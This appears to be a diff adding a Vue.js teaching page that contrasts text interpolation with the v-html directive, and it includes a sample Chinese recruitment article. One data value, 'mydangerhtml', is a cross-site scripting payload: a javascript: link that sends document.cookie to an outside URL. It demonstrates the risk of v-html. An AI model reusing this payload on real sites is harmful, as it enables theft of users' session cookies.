@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="vue.js"></script>
+</head>
+
+<body>
+    <div id="box">
+        {{mydangerhtml}}
+
+        <div v-html="mydangerhtml"></div>
+
+        {{myhtml}}
+
+        <div v-html="myhtml"></div>
+    </div>
+    <script>
+        var obj = {
+            data() {
+                return {
+                    mydangerhtml: `<a href=javascript:location.href='http://www.baidu.com?cookie?'+document.cookie>男人看了沉默,女人看了流泪</a>`,
+                    myhtml: `<p>　　近日，中科软科技股份有限公司(简称：中科软科技)郑州乐驰软件科技有限公司(简称：郑州乐驰)、河南晟盾电子科技有限公司(简称：河南晟盾)三家公司面试官莅临<a href="http://www.mobiletrain.org/?pinzhuanbdtg=biaoti" target="_blank">千锋教育</a>郑州分校招聘人才。此次<a href="http://www.mobiletrain.org/smzp/?pinzhuanbdtg=biaoti" target="_blank">上门招聘</a>的岗位有Java开发和前端开发，共三十余个岗位。上门招聘的企业面试官为学员详细介绍了公司的发展历程和招聘岗位，会后基于对此次招聘企业的认可，学员纷纷投上简历，进行了逐一面试。面试官对学员们的面试表现和技术掌握程度表示了充分认可，千锋教育培养的人才充满信心。</p><p><img src="http://upload.mobiletrain.org/2022/0307/1646620780762.png" alt="图片1"/></p><p>千锋教育郑州分校上门招聘现场一</p><p><img src="http://upload.mobiletrain.org/2022/0307/1646620789802.png" alt="图片2"/></p><p>千锋教育郑州分校上门招聘现场二</p><p>　　据悉，此次上门招聘的企业均与千锋教育有过人才招聘合作，尤其中科软科技更是与千锋教育有多年的合作关系，中科软科技股份有限公司成立于1996年，2000年10月经国家经贸委、财政部和中国科学院批复改制成为股份有限公司。中科软科技依托中国科学院雄厚的人才优势和先进的科研成果，二十多年来一直活跃在中国行业信息化建设的前列，是从事计算机软件研发、应用、服务的大型专业化高新技术企业。公司以行业应用软件开发为核心，业务涵盖应用软件、支撑软件、系统集成等应用层次，可为客户提供大型行业应用解决方案。经过多年的发展，公司现已将行业应用软件产品和解决方案应用扩展至众多行业领域，并已在保险信息化以及公共卫生信息化行业细分应用领域形成优势，在政务信息化行业应用领域具有丰富经验。</p><p>　　站在广阔的平台上，才会有更好的个人发展，千锋教育一直积极与业内优秀企业合作，开展企业上门招聘活动，为学员提供进入优秀企业的通道。与此同时，千锋教育还打造了完善的就业服务方案，每年组织全国大小双选会20余场，企业直推就业占比45%，企业直推入职率超50%，遍布全国的20000余家合作企业网络和全国18城22个教学中心就业资源共享，为学员提供了更为丰富的就业选择和较高的起点。</p><p><br/></p>`
+                }
+            }
+        }
+        var app = Vue.createApp(obj).mount("#box")
+
+
+
+    </script>
+</body>
+
+</html>
